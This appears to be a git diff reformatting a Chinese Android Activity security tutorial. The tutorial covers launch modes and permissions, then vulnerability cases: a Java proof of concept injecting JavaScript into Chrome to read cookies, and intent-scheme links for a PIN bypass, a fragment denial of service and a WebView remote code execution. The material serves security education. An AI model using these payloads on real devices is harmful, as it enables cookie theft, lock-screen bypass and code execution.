@@ -33,17 +33,21 @@ Activity是为用户操作而展示的可视化用户界面。比如说，一个
 
 配置文件中注册组件
 
-	<activity android:name=".ExampleActivity" android:icon="@drawable/app_icon">
-	    <intent-filter>
-	        <action android:name="android.intent.action.MAIN" />
-	        <category android:name="android.intent.category.LAUNCHER" />
-	    </intent-filter>
-	</activity>
+```xml
+<activity android:name=".ExampleActivity" android:icon="@drawable/app_icon">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
+</activity>
+```
 
 直接使用intent对象指定application以及activity启动
 
-	Intent intent = new Intent(this, ExampleActivity.class);
-	startActivity(intent);
+```java
+Intent intent = new Intent(this, ExampleActivity.class);
+startActivity(intent);
+```
 
 > 未配置intent-filter的activity只能使用显示启动。
 
@@ -51,10 +55,11 @@ Activity是为用户操作而展示的可视化用户界面。比如说，一个
 
 隐式启动
 
-	Intent intent = new Intent(Intent.ACTION_SEND);
-	intent.putExtra(Intent.EXTRA_EMAIL, recipientArray);
-	startActivity(intent);
-
+```java
+Intent intent = new Intent(Intent.ACTION_SEND);
+intent.putExtra(Intent.EXTRA_EMAIL, recipientArray);
+startActivity(intent);
+```
 
 
 **加载模式launch mode**
@@ -69,7 +74,9 @@ Activity有四种加载模式：
 设置的位置在AndroidManifest.xml文件中activity元素的android:launchMode
 属性：
 
-	<activity android:name="ActB" android:launchMode="singleTask"></activity>
+```
+<activity android:name="ActB" android:launchMode="singleTask"></activity>
+```
 
 Activity launch mode 用于控制创建task和Activity实例。默认“standard“模式。Standard模式一次启动即会生成一个新的Activity实例并且不会创建新的task，被启动的Activity和启动的Activity在同一个栈中。当创建新的task时，intent中的内容有可能被恶意应用读取所以建议若无特别需求使用默认的standard模式即不配置launch mode属性。launchMode能被Intent 的flag覆盖。
 
@@ -124,23 +131,23 @@ dangerous|调用者需在配置清单中申明此权限.
 signature|调用者需有相同签名.
 signatureOrSystem|调用者需system uid或者具有相同签名.
 
-
-    <!-- *** POINT 1 *** Define a permission with protectionLevel="signature" -->
-    <permission
-    android:name="org.jssec.android.permission.protectedapp.MY_PERMISSION"
-    android:protectionLevel="signature" />
-    <application
-    android:icon="@drawable/ic_launcher"
-    android:label="@string/app_name" >
-    <!-- *** POINT 2 *** For a component, enforce the permission with its permission attribute -->
-    <activity
-    android:name=".ProtectedActivity"
-    android:exported="true"
-    android:label="@string/app_name"
-    android:permission="org.jssec.android.permission.protectedapp.MY_PERMISSION" >
-    <!-- *** POINT 3 *** If the component is an activity, you must define no intent-filter -->
-    </activity>
-
+```xml
+<!-- *** POINT 1 *** Define a permission with protectionLevel="signature" -->
+<permission
+android:name="org.jssec.android.permission.protectedapp.MY_PERMISSION"
+android:protectionLevel="signature" />
+<application
+android:icon="@drawable/ic_launcher"
+android:label="@string/app_name" >
+<!-- *** POINT 2 *** For a component, enforce the permission with its permission attribute -->
+<activity
+android:name=".ProtectedActivity"
+android:exported="true"
+android:label="@string/app_name"
+android:permission="org.jssec.android.permission.protectedapp.MY_PERMISSION" >
+<!-- *** POINT 3 *** If the component is an activity, you must define no intent-filter -->
+</activity>
+```
 
 
 **关键方法**
@@ -293,43 +300,46 @@ http://www.wooyun.org/bugs/wooyun-2012-05478
 
 漏洞存在于Chrome Android版本v18.0.1025123，class "com.google.android.apps.chrome.SimpleChromeActivity" 允许恶意应用注入js代码到任意域. 部分 AndroidManifest.xml配置文件如下
 
-	<activity android:name="com.google.android.apps.chrome.SimpleChromeActivity" android:launchMode="singleTask" android:configChanges="keyboard|keyboardHidden|orientation|screenSize">
-            <intent-filter>
-                <action android:name="android.intent.action.VIEW" />
-                <category android:name="android.intent.category.DEFAULT" />
-            </intent-filter>
-	</activity>
+```xml
+<activity android:name="com.google.android.apps.chrome.SimpleChromeActivity" android:launchMode="singleTask" android:configChanges="keyboard|keyboardHidden|orientation|screenSize">
+        <intent-filter>
+            <action android:name="android.intent.action.VIEW" />
+            <category android:name="android.intent.category.DEFAULT" />
+        </intent-filter>
+</activity>
+```
 
 Class "com.google.android.apps.chrome.SimpleChromeActivity" 配置 <intent-filter>但是未设置  "android:exported" 为 "false". 恶意应用先调用该类并设置data为” http://google.com” 再次调用时设置data为恶意js例如'javascript:alert(document.cookie)', 恶意代码将在http://google.com域中执行. "com.google.android.apps.chrome.SimpleChromeActivity" class 可以通过Android api或者am（activityManager）打开. 
 POC如下
 
-	public class TestActivity extends Activity {
-	    @Override
-	    public void onCreate(Bundle savedInstanceState) {
-	        super.onCreate(savedInstanceState);
-	        Intent i = new Intent();
-	                ComponentName comp = new ComponentName(
-	                                 "com.android.chrome",
-	                                 	"com.google.android.apps.chrome.SimpleChromeActivity");
-	                i.setComponent(comp);
-	                i.setAction("android.intent.action.VIEW");
-	                Uri data = Uri.parse("http://google.com");
-	                i.setData(data);
-               
-	                startActivity(i);
-               
-		                try {
-	                        Thread.sleep(5000);
-	                        }
-	 	                      catch (Exception e) {}
-              
-	                data = Uri.parse("javascript:alert(document.cookie)");	
-	                i.setData(data);
-               
-	                startActivity(i);
-	    }
-	}
-
+```java
+public class TestActivity extends Activity {
+    @Override
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        Intent i = new Intent();
+                ComponentName comp = new ComponentName(
+                                 "com.android.chrome",
+                                 	"com.google.android.apps.chrome.SimpleChromeActivity");
+                i.setComponent(comp);
+                i.setAction("android.intent.action.VIEW");
+                Uri data = Uri.parse("http://google.com");
+                i.setData(data);
+           
+                startActivity(i);
+           
+	                try {
+                        Thread.sleep(5000);
+                        }
+ 	                      catch (Exception e) {}
+          
+                data = Uri.parse("javascript:alert(document.cookie)");	
+                i.setData(data);
+           
+                startActivity(i);
+    }
+}
+```
  
 **案例5：隐式启动intent包含敏感数据**
 
@@ -341,23 +351,29 @@ POC如下
 
 Fragment这里只提一下，以后可能另写一篇。
 
-	<a href="intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end">
-    16、bypass Pin android 3.0-4.3 （selector）
-	</a><br>
+```javascirpt
+<a href="intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end">
+16、bypass Pin android 3.0-4.3 （selector）
+</a><br>
+```
 
 ![](img/pin.png)
 
-	<a href="intent:#Intent;S.:android:show_fragment=XXXX;launchFlags=0x00008000;SEL;component=com.android.settings/com.android.settings.Settings;end">
-    17、fragment dos android 4.4 (selector)
-	</a><br>
+```javascript
+<a href="intent:#Intent;S.:android:show_fragment=XXXX;launchFlags=0x00008000;SEL;component=com.android.settings/com.android.settings.Settings;end">
+17、fragment dos android 4.4 (selector)
+</a><br>
+```
 
 ![](img/fragdos.jpg)
 
 **案例7:webview RCE**
 
-	<a href="intent:#Intent;component=com.gift.android/.activity.WebViewIndexActivity;S.url=http://drops.wooyun.org/webview.html;S.title=WebView;end">
-    15、驴妈妈代码执行（fixed）
-	</a><br>
+```javascript
+<a href="intent:#Intent;component=com.gift.android/.activity.WebViewIndexActivity;S.url=http://drops.wooyun.org/webview.html;S.title=WebView;end">
+15、驴妈妈代码执行（fixed）
+</a><br>
+```
 
 ![](img/lvmm.jpg)
 
